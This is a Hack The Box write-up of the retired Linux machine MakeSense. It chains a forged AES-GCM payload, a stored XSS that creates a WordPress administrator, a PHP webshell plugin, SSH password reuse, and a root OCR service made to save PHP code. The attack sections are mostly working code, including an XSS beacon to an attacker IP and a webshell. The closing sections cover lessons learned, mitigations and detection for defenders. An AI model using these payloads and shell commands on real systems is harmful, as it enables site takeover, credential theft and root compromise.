---
machine: MakeSense
os: Linux
difficulty: Medium
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/918
category: Machines
state: Retired
pwned: 2026-11-07
tags: [web, wordpress, xss, aes-gcm, php, privesc]
---

# MakeSense — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (2026-11-07) · [machine 918](https://labs.hackthebox.com/achievement/machine/4187928/918) · rank #4897 · 650 XP.
> Real flags and credentials live in `private/` and are never published here.

## TL;DR

WordPress with a custom theme (`webagency`) that transcribes voice in the browser and sends the result **AES-256-GCM encrypted** to `admin-ajax.php`. The key ships in the theme JS, so a valid payload can be forged: the `summary` field is decrypted and rendered **unescaped** in the admin panel, which an admin bot opens every minute → stored XSS. The XSS creates a new administrator, a plugin upload follows, and that gives RCE as `www-data`. `wp-config.php` leaks `walter`'s password, reused over SSH. For root: an OCR service on `127.0.0.1:8001` runs as **root** and saves its output inside its own docroot → make it transcribe a PHP payload, save it as `.php`, and it executes as root.

## Recon

```bash
# 1. Vhost in /etc/hosts (or use --resolve, see below)
echo "10.129.145.90 makesense.htb" | sudo tee -a /etc/hosts

# 2. Full TCP scan and service detection
nmap -Pn -p- -T4 --min-rate 1000 --open 10.129.145.90
nmap -Pn -sS -sV -p 22,80,443,8001 10.129.145.90
```

- Ports: **22** (OpenSSH 9.6p1 Ubuntu), **443** (Apache 2.4.58, Ubuntu), **80 and 8001 filtered**.
- Services: WordPress with the `webagency` theme; Chrome headless/chromedriver (admin bot); `tesseract` installed.
- Usual trap: port 80 is *filtered*, not closed. `curl http://...` returns `code=000` and the site looks down. Everything runs on **HTTPS**.

Equivalent without touching `/etc/hosts`:

```bash
curl -sk --resolve makesense.htb:443:10.129.145.90 https://makesense.htb/ -o home.html
```

## Enumeration

```bash
# Technology and vhost
curl -sk --resolve makesense.htb:443:10.129.145.90 -I https://makesense.htb/
curl -sk --resolve makesense.htb:443:10.129.145.90 https://makesense.htb/ | \
  grep -oE '/wp-content/(themes|plugins)/[A-Za-z0-9_.-]+' | sort -u

# Theme assets: all the logic lives here
for f in main.js assets/js/whisper/whisper.js assets/js/whisper/whisper-wrapper.js; do
  curl -sk --resolve makesense.htb:443:10.129.145.90 \
    "https://makesense.htb/wp-content/themes/webagency/$f" -o "$(basename $f)"
done

# Directory listing on uploads (it was enabled)
curl -sk --resolve makesense.htb:443:10.129.145.90 https://makesense.htb/wp-content/uploads/
```

Findings:

- **Public nonce** embedded in the front page HTML:

  ```html
  <script id="whisper-wrapper-js-extra">
  var webagency_ajax = {"ajax_url":"https://makesense.htb/wp-admin/admin-ajax.php",
                        "nonce":"<NONCE>","theme_url":"...","site_url":"..."};
  </script>
  ```

- `whisper-wrapper.js` declares `const ENCRYPTION_KEY = '<key>'` **client-side**, and `functions.php` mirrors it server-side as `WEBAGENCY_ENCRYPTION_KEY`. Consequence: anyone can encrypt payloads the backend will accept as legitimate.
- `main.js` reveals the whole flow (see Foothold) and the exact name of every field.
- `/wp-content/uploads/` with directory listing: uploaded audio and filenames are visible.

## Foothold

### The application's real flow

1. `save_voice_raw` — multipart with `action`, `nonce` and `voice_recording` (WAV). Returns a real `post_id`:

   ```json
   {"success":true,"data":{"message":"Audio saved, processing started.","post_id":69}}
   ```

2. The browser transcribes and **encrypts** `{transcription, summary}`.
3. `save_voice_results` — multipart with `action`, `nonce`, `post_id` and `encrypted_payload`. Replies `"Results saved successfully!"`.

### The encryption (and why it can be forged)

`whisper.js` → `encryptPayload()`:

- AES-256 key = `SHA-256(ENCRYPTION_KEY)` (the plain key text, no salt).
- AES-GCM with a random **12-byte** IV; WebCrypto appends the tag.
- Sent as `base64(IV ‖ ciphertext ‖ tag)`.

With the key published in the JS, encryption stops being a trust boundary:

```python
import base64, hashlib, json, os
from Crypto.Cipher import AES

ENCRYPTION_KEY = "<key from the JS>"

def encrypt(obj):
    key = hashlib.sha256(ENCRYPTION_KEY.encode()).digest()
    iv = os.urandom(12)
    ct, tag = AES.new(key, AES.MODE_GCM, nonce=iv).encrypt_and_digest(json.dumps(obj).encode())
    return base64.b64encode(iv + ct + tag).decode()
```

### Time-wasting mistakes

- `main.js` sends `encrypted_payload`; using `payload` (as older scripts did) returns `success` but stores nothing.
- The action is `save_voice_results`, not `submit_transcription`, and the POST goes to `admin-ajax.php`, not the site root.
- The nonce is read from the front page and expires; refresh it on every run.

### Stored XSS in the admin panel

`summary` is stored encrypted, decrypted server-side and rendered **unescaped** in `wp-admin/edit.php?post_type=contact_submission`. The admin bot visits that page roughly every 60 s.

Two details decide whether a payload works:

1. Rendering uses `innerHTML` → `<script>` **does not execute**; use `onerror`.
2. The field goes through escaping that turns `"` into `&quot;` and breaks the JS: **single line, single quotes only**.

Beacon that proves execution (minimal):

```html
<img src=x onerror="new Image().src='http://10.10.15.215:8000/?r=ALIVE'">
```

Catcher:

```bash
python3 -m http.server 8000        # or ms_exploit.py --listen
```

The first hit carries `wp-settings-time-3=...` and `https://makesense.htb/wp-admin/edit.php?post_type=contact_submission`: the JS runs **authenticated as administrator**. `wordpress_logged_in` is HttpOnly, so stealing the cookie is useless — you must act **inside** the bot's browser.

### From XSS to your own administrator

`user-new.php` creates users with a nonce the bot itself can read (same origin). This one-liner goes into `summary` the same way:

```js
fetch('/wp-admin/user-new.php').then(r=>r.text()).then(t=>{var d=new DOMParser().parseFromString(t,'text/html'),n=d.querySelector('[name=_wpnonce_create-user]').value,f=new FormData();f.append('action','createuser');f.append('_wpnonce_create-user',n);f.append('_wp_http_referer','/wp-admin/user-new.php');f.append('user_login','pwned');f.append('email','pwned@makesense.htb');f.append('pass1','<PASS>');f.append('pass2','<PASS>');f.append('role','administrator');f.append('createuser','Add New User');fetch('/wp-admin/user-new.php',{method:'POST',body:f}).then(r=>r.text())})
```

Verification (the confirmation beacon can get lost; the login is what matters):

```bash
curl -sk -c cj.txt -b "wordpress_test_cookie=WP+Cookie+check" \
  --data-urlencode "log=pwned" --data-urlencode "pwd=<PASS>" \
  -d "wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
  https://makesense.htb/wp-login.php -o /dev/null -w '%{http_code}\n'   # 302
grep -c wordpress_logged_in cj.txt                                      # 1
```

## Lateral movement

### www-data via a plugin

A WordPress administrator can upload plugins; the ZIP ships a webshell:

```php
<?php /* Plugin Name: Pwn Shell */ if (isset($_REQUEST['c'])) { echo shell_exec($_REQUEST['c']); } ?>
```

```bash
python3 - <<'PY'
import zipfile
php = '<?php /* Plugin Name: Pwn Shell */ if (isset($_REQUEST["c"])) { echo shell_exec($_REQUEST["c"]); } ?>'
with zipfile.ZipFile('/tmp/pwn.zip','w') as z:
    z.writestr('pwn-shell/shell.php', php)
PY

# nonce from the upload form
N=$(curl -sk -b cj.txt https://makesense.htb/wp-admin/plugin-install.php?tab=upload \
      | grep -o 'name="_wpnonce" value="[A-Za-z0-9]*"' | head -1 | sed 's/.*value="//;s/"//')

curl -sk -b cj.txt -F "pluginzip=@/tmp/pwn.zip;type=application/zip" -F "_wpnonce=$N" \
  -F "install-plugin-submit=Install Now" \
  "https://makesense.htb/wp-admin/update.php?action=upload-plugin"     # "Plugin installed successfully"

curl -sk --data-urlencode "c=id" \
  https://makesense.htb/wp-content/plugins/pwn-shell/shell.php        # uid=33(www-data)
```

### www-data → walter

`wp-config.php` (readable by `www-data`) holds the database credentials, and **the password is reused for SSH**:

```bash
curl -sk --data-urlencode 'c=grep -E "DB_USER|DB_PASSWORD" /var/www/html/wp-config.php' \
  https://makesense.htb/wp-content/plugins/pwn-shell/shell.php

sshpass -p '<DB_PASSWORD>' ssh walter@10.129.145.90 'id; cat ~/user.txt'
```

## Privilege escalation

### Local enumeration

```bash
id; groups
ps aux | grep -vE '^\[|kthread|kworker' | head -30
ss -ltnp
ls -la /opt
```

The relevant line:

```
root 1401  php -S 127.0.0.1:8001 -t /root/ocr4/
```

A PHP built-in server running **as root**, listening only on loopback and serving `/root/ocr4`. As `walter` it is reachable:

```bash
curl -si http://127.0.0.1:8001/                    # 401, WWW-Authenticate: Basic realm="OCR Protected"
curl -s -u '<user>:<pass>' http://127.0.0.1:8001/  # 200 -> OCR canvas
```

`walter`'s own credentials open the Basic auth.

### Anatomy of the OCR app

- A canvas posts `canvas_image=data:image/png;base64,...`.
- Tesseract performs OCR and returns the text (`class="result-block"`).
- A second form **saves** the result: `ocr_id`, `filename` and the button `save_output=Save`.
- Saving writes into `saved/`, **inside the `php -S` docroot**.

### What does NOT work (tested)

| Attempt | Result |
|---|---|
| Command injection in `filename` (`x; sleep 5; #`, `$(sleep 5)`) | No delay: the name is sanitized to `[A-Za-z0-9._-]`, everything else becomes `_` |
| Traversal in `filename` (`../`, `/tmp/x`) | `/` and `..` stripped; everything lands in `saved/` |
| Traversal in `ocr_id` (`../../root/root.txt`) | `Invalid OCR request. Cannot save.` |
| Injection in the data-URL MIME type | Immediate response, no effect |
| Omitting `save_output` | `notice error` (the button's `name` is required) |

### The vector: writing code into a root-owned docroot

`filename` does keep letters, digits and dots → `x.php` is allowed. And the file content is **whatever Tesseract reads from the image we upload**. So make it transcribe a PHP payload and it runs as root.

```bash
python3 - <<'PY'
from PIL import Image, ImageDraw, ImageFont
txt = '<?php echo file_get_contents("/root/root.txt"); ?>'
f = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 60)
img = Image.new("RGB", (int(f.getlength(txt)) + 80, 110), "white")
ImageDraw.Draw(img).text((30, 22), txt, fill="black", font=f)
img.save("/tmp/root.png")
PY

# 1) upload the image and keep the ocr_id
curl -s -u '<user>:<pass>' -c cj_ocr.txt \
  --data-urlencode "canvas_image=data:image/png;base64,$(base64 -w0 /tmp/root.png)" \
  http://127.0.0.1:8001/ -o ocr.html
ID=$(grep -o 'name="ocr_id" value="[^"]*"' ocr.html | sed 's/.*value="//;s/"//')

# 2) save the result as PHP (executes inside the docroot)
curl -s -u '<user>:<pass>' -b cj_ocr.txt \
  --data-urlencode "ocr_id=$ID" --data-urlencode "filename=r1.php" \
  --data-urlencode "save_output=Save" http://127.0.0.1:8001/
# -> Saved as: saved/r1.php

# 3) run it as root
curl -s -u '<user>:<pass>' http://127.0.0.1:8001/saved/r1.php      # root flag
```

With `<?php echo shell_exec("id"); ?>` the context is confirmed:

```
uid=0(root) gid=0(root) groups=0(root)
```

Note: `saved/` is ephemeral (the service cleans it up), so re-verification means repeating all three steps back to back.

## Evidence

Observed outputs (no flags, no credentials):

```
$ curl -u <cred> http://127.0.0.1:8001/saved/r3.php
uid=0(root) gid=0(root) groups=0(root)

$ curl -u <cred> http://127.0.0.1:8001/saved/t.php      # <?php echo 7*7; ?>
49

$ curl -sk --data-urlencode c=id https://makesense.htb/wp-content/plugins/pwn-shell/shell.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

For a public repo, crop screenshots of the panel, the OCR page and the `uid=0` output — and **never** include flags.

## Lessons learned

- **Read the theme JS before writing an exploit**: hours of failed scripts came down to one field name (`encrypted_payload`) and one wrong action.
- **`innerHTML` + `<script>` does not execute**; `onerror` does. And escaping `"` to `&quot;` forces single-line payloads with single quotes.
- **A secret in the client is not a secret**: an AES key in JS turns encryption into a format, not a control.
- **Credential reuse**: the database password also opened SSH and the internal service's Basic auth.
- **Loopback services are a pivot from a user, not from anonymous**: without `walter`, port 8001 is unreachable (hence `filtered` externally).
- **Save directories inside a docroot are code execution** when the server interprets PHP.
- Practical detail: the bot takes ~60 s and saved files expire; automating each phase in a single script pays off.

## Mitigations and detection

Fixes:

- Escape the panel output (`esc_html`, `wp_kses_post`) and enforce **capabilities + nonce** on `save_voice_results` instead of accepting any `post_id`.
- Do not encrypt client-side with a public key: if the data is sensitive the secret belongs on the server; client-side encryption adds no confidentiality against the user.
- Harden WordPress: `DISALLOW_FILE_MODS` / `DISALLOW_FILE_EDIT`, plugins from a vetted repository, restrict `install_plugins`.
- **Least privilege** for the OCR service: dedicated user (not root), `open_basedir`, no write access to the docroot, results stored outside the served tree.
- Never reuse the database password over SSH or internal services; dedicated strong credentials for Basic auth, or mTLS on loopback.
- Disable directory listing under `uploads/` and enforce an extension allowlist.

Detection:

- Alerts on **new administrator accounts** and on `user-new.php` requests coming from bot sessions.
- File integrity monitoring inside `wp-content` (new plugins, new `.php` files).
- PHP processes spawning `tesseract` or writing `.php` into their own docroot (anomalous process chain).
- Access to `127.0.0.1:8001` from accounts that do not need it.

References: CWE-79 (stored XSS), CWE-798 (hardcoded credentials), CWE-250/CWE-269 (excessive privileges), CWE-434 (dangerous file upload), OWASP Top 10 A03/A07, MITRE ATT&CK T1059.004 and T1505.003.

## References

- Machine: <https://labs.hackthebox.com/achievement/machine/4187928/918>
- WordPress hardening: <https://developer.wordpress.org/advanced-administration/security/hardening/>
- WebCrypto AES-GCM: <https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/encrypt>
- PHP built-in server: <https://www.php.net/manual/en/features.commandline.webserver.php>
